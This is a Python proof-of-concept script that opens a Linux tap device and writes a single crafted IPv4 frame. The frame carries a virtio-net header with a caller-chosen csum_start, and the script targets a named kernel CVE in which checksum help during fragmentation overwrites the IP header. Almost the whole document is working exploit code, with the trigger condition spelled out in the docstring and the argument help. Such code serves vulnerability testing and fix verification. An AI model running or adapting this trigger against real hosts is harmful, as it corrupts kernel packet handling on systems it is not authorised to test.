#!/usr/bin/python3 -I
"""Write one IPv4 frame into a tap, with a virtio-net header whose
csum_start the caller chooses, to exercise CVE-2026-99999.

The tap must already exist, persistent and with the vnet_hdr flag
(`ip tuntap add dev <tap> mode tap vnet_hdr`).  We attach to it and
write a single frame prefixed with a 10-byte virtio_net_hdr carrying
VIRTIO_NET_HDR_F_NEEDS_CSUM, so the host builds the skb with
ip_summed == CHECKSUM_PARTIAL and skb->csum_start taken from the header.

With --csum-start below the end of the IP header, skb->csum_start points
into (or before) the IP header.  When such a packet is forwarded to a
device whose MTU it exceeds, ip_do_fragment() calls skb_checksum_help(),
which on an unfixed kernel writes the folded sum into the network header.
The fix rejects it first (ip_check_csum_start).  This is the TAP path the
advisory describes: a guest's virtio-net metadata reaching the host
IPv4 stack.

Nothing here is specific to a kernel version; it only builds and injects
a frame.  usage:
  csum-inject.py --dev <tap> --dmac <aa:bb:..> --src <ip> --dst <ip>
                 --csum-start <n> [--csum-offset <n>] [--size <bytes>]
"""
import argparse, errno, fcntl, socket, struct, sys

TUNSETIFF = 0x400454CA
TUNSETOFFLOAD = 0x400454D0
IFF_TAP = 0x0002
IFF_NO_PI = 0x1000
IFF_VNET_HDR = 0x4000
TUN_F_CSUM = 0x01
VIRTIO_NET_HDR_F_NEEDS_CSUM = 0x01
VIRTIO_NET_HDR_GSO_NONE = 0x00


def checksum16(data):
    if len(data) % 2:
        data += b"\0"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def mac(s):
    return bytes(int(x, 16) for x in s.split(":"))


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--dev", required=True)
    p.add_argument("--dmac", required=True, help="the tap's own MAC, so the host takes the frame")
    p.add_argument("--smac", default="02:00:00:00:00:01")
    p.add_argument("--src", required=True)
    p.add_argument("--dst", required=True)
    p.add_argument("--csum-start", type=int, required=True,
                   help="offset from the start of the L2 frame; <14+ihl triggers the bug")
    p.add_argument("--csum-offset", type=int, default=6)
    p.add_argument("--size", type=int, default=2800, help="IP total length")
    args = p.parse_args()

    tun = open("/dev/net/tun", "r+b", buffering=0)
    ifr = struct.pack("16sH", args.dev.encode(), IFF_TAP | IFF_NO_PI | IFF_VNET_HDR)
    fcntl.ioctl(tun, TUNSETIFF, ifr)
    try:
        fcntl.ioctl(tun, TUNSETOFFLOAD, struct.pack("I", TUN_F_CSUM))
    except OSError:
        pass  # inject honours the vnet header regardless; best effort

    eth = mac(args.dmac) + mac(args.smac) + struct.pack("!H", 0x0800)

    payload_len = args.size - 20 - 8
    if payload_len < 0:
        sys.exit("--size must be at least 28")
    udp = struct.pack("!HHHH", 4444, 4445, 8 + payload_len, 0) + b"\x42" * payload_len

    # frag_off 0: DF clear, so the router fragments rather than sending
    # "fragmentation needed".  ttl 64 so the forward does not expire.
    iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, args.size, 0x1234, 0, 64, 17, 0,
                      socket.inet_aton(args.src), socket.inet_aton(args.dst))
    iph = iph[:10] + struct.pack("!H", checksum16(iph)) + iph[12:]

    frame = eth + iph + udp
    vnet = struct.pack("<BBHHHH", VIRTIO_NET_HDR_F_NEEDS_CSUM, VIRTIO_NET_HDR_GSO_NONE,
                       0, 0, args.csum_start, args.csum_offset)
    try:
        tun.write(vnet + frame)
        tun.flush()
    except OSError as e:
        if e.errno == errno.EINVAL:
            # Some kernels bound csum_start in virtio_net_hdr_to_skb() and
            # refuse the frame here, before it can reach the IPv4 stack.
            # That is a different defence; this path is then not the one
            # the fix guards, so say so rather than fail.
            sys.stderr.write("inject: write rejected (EINVAL) at the virtio layer\n")
            sys.exit(2)
        raise


if __name__ == "__main__":
    main()
